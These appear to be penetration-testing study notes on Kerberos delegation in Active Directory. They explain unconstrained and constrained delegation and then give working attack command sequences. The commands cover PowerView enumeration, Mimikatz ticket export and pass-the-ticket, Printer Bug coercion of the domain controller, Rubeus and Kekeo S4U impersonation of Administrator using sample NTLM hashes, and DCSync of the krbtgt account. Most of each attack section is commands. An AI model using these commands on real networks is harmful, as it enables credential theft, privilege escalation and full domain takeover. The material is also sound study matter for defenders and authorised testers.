Kerberos Delegation allows the reuse of end-user credentials to access resources hosted on a different server
This is typically useful in multi-tier serice or applicaitons where Kerberos double-hop is required

Example: a web server and a seperate database server, users authenticate to ta web server and the web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account

The service account for web service must be trusted for delegation to be able to make requests as a user


Steps for Delegation


1. A user provides credentials to the DC
2. The DC returns A TGT
3. The user requests a TGS for the web service on the Web Server
4. The DC provides a TGS
5. The user sends the TGT and the TGS to the web server, due to delegation the TGT of the user is embedded in the TGS
6. The web server service account uses the user's TGT to request a TGS for the database server from the DC
7. The web server service account connects to the database server as the user



There are two basic types of kerberos delegation. In both types of delegations a mechanism is required to impersonate the incoming user and authenticate to the second hop server as the user.

- General/Basic or Unconstrained Delegation which allows the first hop server to request access to any service on any computer on the domain
- Constrained Delegation which allows the first hop server to request access only to specified services on specified computers. If the user is not user Kerberos Authentication to authenticat to the first hop server, Windows offers Protocol transition to transition the request to Kerberos


## Unconstrained Delegation

When set for a paticular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user. When unconstrained delegation is enabled, the DC places the user's TGT inside the TGS. When presented to the server with unconstrained delegation the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any othe resource as the user. This could be used to escalate privileges in the case we can compromise the computer with unconstrained delegation and a domain admin connects to that machine.

Check for unconstrained delegation

```powershell
#The DC will always return as unconstrained, ignore this
#Discover domain computers which have unconstrained delegation enabled usingPowerView:
Get-NetComputer -UnConstrained


#Using ActiveDirectorymodule:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}


#Check for a connection from a certain user
Invoke-UserHunter -ComputerName appsrv -Poll 100 -Username Administrator -Delay 5 -Verbose
```


Compromise servers where this is enabled.

```powershell
#Run following command on it to check if any DA token is available:
Invoke-Mimikatz -Command '"sekurlsa::tickets"'


#We must trick or wait for a domain admin to connect a service on appsrv.
#Now, if the command is run again:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'


#The DA token could be reused:
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-abc.example.LOCAL.kirbi"' 
```

#### Printer Bug

A feature of MS-RPRN which allows any domain user (Authenticated User) to force any machine that is running the spooler service to connect to a second machine of the domain user's choice. We can force the dc to connect to appsrv by abusing the Printer Bug.


```powershell
#We can capture the TGT of dc$ by using Rubeus (https://github.com/GhostPack/Rubeus) on appsrv:
.\Rubeus.exe monitor /interval:5 /nowrap


#And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on any machine in the domain:
.\MS-RPRN.exe \\dc.abc.example.local  \\appsrv.abc.example.local 


#Copy the base64 encoded TGT, remove extra spaces (if any) and use it on any machine:
.\Rubeus.exe ptt /ticket:


#Once the ticket is injected, run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\krbtgt"
```

## Constrained Delegation

When enabled on a service account, allows access only to specified  services on specified computers as a user. A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization. To impersonate the user, Service for User (S4U) extension is used which provides two extensions:

- Service for User to Self (S4U2self) - allows a service to obtain a forwardable TGS to itself on behalf of a user with just the prinicipal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl Attribute
- Service for User to Proxy (S4U2proxy) - allows a service to obtain a TGS to a second service on behalf of a user. Which service is controlled by msDS-AllowedToDelegeateTo attribute. This attribute contains a list of SPNs which the user tokens can be forwarded


Example with protocol transition
1. A user, Joe, authenticates to the web service (running with service account websvc) using a non-kerberos compatible authentication mechanism
2. The web service requests a ticket from the KDC for Joe's account without supplying a password, as the websvc account
3. The KDC checks the websvc UserAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION (T2A4D) attribute, and that Joe's account is not blocked for delegation. If ok it returns a forwardable ticket for Joe's account (S4U2self)
4. The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/mssql.abc.example.local service
5. The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for mssql (S4U2proxy)
6. The web service can now authenticate to CIFS on mssql as Joe using the supplied TGS

To abuse delegation here we need to have access to an account that has TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo as ANY user


Abuse constrained delegation with Invoke-Mimikatz

```powershell
#Enumerate users and computers with constrained delegation enabled
#Using PowerView(dev)
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth


#Using ActiveDirectorymodule:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo


#Either plaintext password or NTLM hash is required. 
#We already have access to websvc'shash from adminsrv
#Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
tgt::ask /user:websvc /domain:abc.example.local /rc4:cc098f204c5887eaa8253e7c2749156f 


#Using s4u from Kekeo, we request a TGS (steps 4 & 5):
tgs::s4u /tgt:TGT_websvc@abc.example.LOCAL_krbtgt~abc.example.local@abc.example.LOCAL.kirbi /user:Administrator@abc.example.local /service:cifs /mssql.abc.example.LOCAL


#Using mimikatz, inject the ticket:
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@abc.example.local@abc.example.LOCAL_cifs~mssql.abc.example.LOCAL@abc.example.LOCAL.kirbi"'

ls\\mssql.abc.example.local\c$
```


Abuse constrained delegation with Rubeus

```powershell
#This will request a TGS and TGT in a single command
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/mssql.abc.example.LOCAL" /ptt

ls \\mssql.abc.example.local\c$
```


Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service


Using Kekeo
```powershell
#Either plaintext password or NTLM hash is required. 
#If we have access to adminsrvhash•Using asktgtfrom Kekeo, we request a TGT:
tgt::ask /user:adminsrv$ /domain:abc.example.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67


#Using s4u from Kekeo_one(no SNAME validation):
tgs::s4u /tgt:TGT_adminsrv$@abc.example.LOCAL_krbtgt~abc.example.local@abc.example.LOCAL.kirbi /user:Administrator@abc.example.local /service:time /dc.abc.example.LOCAL|ldap/dc.abc.example.LOCAL
```

Using Mimikatz
```powershell
Invoke-Mimikatz-Command '"kerberos::ptt TGS_Administrator@abc.example.local@abc.example.LOCAL_ldap~dc.abc.example.LOCAL@abc.example.LOCAL_ALT.kirbi"'

Invoke-Mimikatz-Command '"lsadump::dcsync /user:example\krbtgt"' 
```

Using Rubeus
```powershell
#request TGT and TGS in one command
.\Rubeus.exe s4u /user:adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dc.abc.example.LOCAL" /altservice:ldap /ptt


#After injection, we can run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\krbtgt"' 
```